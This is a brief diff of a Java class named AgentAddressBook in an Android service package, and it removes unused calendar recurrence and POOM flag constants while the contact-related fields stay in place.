@@ -33,17 +33,7 @@ import com.android.service.util.WChar;
 public class AgentAddressBook extends BaseModule {
 
 	private static final String TAG = "AgentAddressbook"; //$NON-NLS-1$
-	private static final int FLAG_RECUR = 0x00000008;
-	private static final int FLAG_RECUR_NoEndDate = 0x00000010;
-	private static final int FLAG_ALLDAY = 0x00000040;
-	
-	private static final int POOM_STRING_SUBJECT = 0x01000000;
-	private static final int POOM_STRING_CATEGORIES = 0x02000000;
-	private static final int POOM_STRING_BODY = 0x04000000;
-	private static final int POOM_STRING_RECIPIENTS = 0x08000000;
-	private static final int POOM_STRING_LOCATION = 0x10000000;
-	private static final int POOM_OBJECT_RECUR = 0x80000000;
-	
+
 	private PickContact contact;
 
 	Markup markupContacts;
